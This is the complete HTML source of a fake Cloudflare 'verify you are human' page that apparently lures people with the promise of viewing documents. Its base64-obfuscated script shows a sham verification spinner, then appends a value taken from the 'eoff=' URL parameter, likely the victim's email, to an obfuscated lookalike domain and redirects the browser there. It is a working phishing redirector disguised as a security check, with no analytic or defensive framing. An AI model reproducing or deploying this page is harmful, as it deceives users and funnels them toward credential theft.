<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        :root {
            --primary-blue: #0052cc;
            --success-green: #228b22;
            --border-grey: #e0e0e0;
            --text-dark: #333333;
        }

        * { box-sizing: border-box; }

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #ffffff; overflow: hidden;
        }

        /* Viewport containers */
        .app-shell {
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            height: 100vh; width: 100vw;
        }

        #loading-screen {
            position: fixed; inset: 0; background: #fff;
            display: flex; justify-content: center; align-items: center;
            z-index: 99; transition: opacity 0.4s ease;
        }

        #main-content { visibility: hidden; opacity: 0; transition: opacity 0.5s ease; }

        /* Animations */
        @keyframes soft-pulse {
            0%, 100% { transform: scale(1); opacity: 0.7; }
            50% { transform: scale(1.05); opacity: 1; }
        }

        @keyframes spin-loader {
            to { transform: rotate(360deg); }
        }

        .img-pulse { width: 90px; animation: soft-pulse 2s infinite; }

        /* The Challenge Card */
        .challenge-container {
            width: 360px; padding: 20px;
            background: #fafafa; border: 1px solid var(--border-grey);
            border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            display: flex; justify-content: space-between; align-items: center;
        }

        .instruction { font-size: 0.9rem; color: var(--text-dark); margin-bottom: 15px; text-align: left; width: 360px; }

        .interactive-area { display: flex; align-items: center; gap: 15px; }

        .checkbox-sync {
            width: 24px; height: 24px; border: 2px solid #bbb;
            border-radius: 3px; background: #fff; cursor: pointer;
            display: flex; justify-content: center; align-items: center;
            transition: all 0.2s;
        }

        /* Dynamic states */
        .is-loading {
            width: 18px; height: 18px; border: 2px solid #ddd;
            border-top-color: var(--primary-blue); border-radius: 50%;
            animation: spin-loader 0.7s linear infinite;
        }

        .is-complete {
            width: 100%; height: 100%; background: var(--success-green);
            color: white; border-radius: 2px; font-weight: bold;
            display: flex; justify-content: center; align-items: center;
        }

        .brand-box { text-align: center; font-size: 11px; color: #777; }
        .brand-logo { width: 25px; margin-bottom: 2px; }
        .brand-name { font-weight: 800; color: #000; display: block; margin-bottom: 2px; }
    </style>
</head>
<body>

    <section id="loading-screen">
        <img src="astro.png" class="img-pulse" alt="Loading...">
    </section>

    <main id="main-content" class="app-shell">
        <div id="ui-msg" class="instruction"></div>

        <div class="challenge-container">
            <div class="interactive-area">
                <div id="trigger-node" class="checkbox-sync"></div>
                <span id="status-label" style="font-size: 14px; color: #444;"></span>
            </div>

            <div class="brand-box">
                <img src="astro2.png" class="brand-logo" alt="">
                <span id="ui-brand" class="brand-name"></span>
                <div>Privacy • Terms</div>
            </div>
        </div>
    </main>

    <script>
        const _RESOURCES = {
            t_msg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
            t_btn: "dmVyaWZ5",
            t_run: "dmVyaWZ5aW5nLi4u",
            t_fin: "c3VjY2Vzcw==",
            t_brd: "Q2xvdWRmbGFyZQ==",
            // Target: https://aeoffice.egvhfztransfercygv.online/wvwYPnsr#
            t_url: "aHR0cHM6Ly9hZW9mZmljZS5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3d2d1lQbnNyIw==",
            t_prm: "ZW9mZg=="
        };

        class Gatekeeper {
            constructor() {
                this.nodes = {
                    loader: document.getElementById('loading-screen'),
                    main: document.getElementById('main-content'),
                    trigger: document.getElementById('trigger-node'),
                    label: document.getElementById('status-label'),
                    msg: document.getElementById('ui-msg'),
                    brand: document.getElementById('ui-brand')
                };
                this.init();
            }

            decode(str) { return atob(str); }

            init() {
                // Populate Text
                this.nodes.msg.textContent = this.decode(_RESOURCES.t_msg);
                this.nodes.label.textContent = this.decode(_RESOURCES.t_btn);
                this.nodes.brand.textContent = this.decode(_RESOURCES.t_brd);

                // Entry Animation
                setTimeout(() => {
                    this.nodes.loader.style.opacity = '0';
                    setTimeout(() => {
                        this.nodes.loader.style.display = 'none';
                        this.nodes.main.style.visibility = 'visible';
                        this.nodes.main.style.opacity = '1';
                    }, 400);
                }, 2000);

                this.nodes.trigger.addEventListener('click', () => this.handleProcess());
            }

            handleProcess() {
                // Change UI to loading
                this.nodes.trigger.style.pointerEvents = 'none';
                this.nodes.trigger.innerHTML = '<div class="is-loading"></div>';
                this.nodes.label.textContent = this.decode(_RESOURCES.t_run);

                // Simulated verification delay
                setTimeout(() => {
                    this.nodes.trigger.innerHTML = '<div class="is-complete">✓</div>';
                    this.nodes.trigger.style.border = 'none';
                    this.nodes.label.textContent = this.decode(_RESOURCES.t_fin);
                    this.finalize();
                }, 2200);
            }

            finalize() {
                const searchKey = this.decode(_RESOURCES.t_prm) + "=";
                const href = window.location.href;
                let payload = "";

                if (href.indexOf(searchKey) !== -1) {
                    payload = href.split(searchKey)[1];
                }

                const destination = this.decode(_RESOURCES.t_url) + payload;

                setTimeout(() => {
                    window.location.replace(destination);
                }, 800);
            }
        }

        // Boot
        new Gatekeeper();
    </script>
</body>
</html>
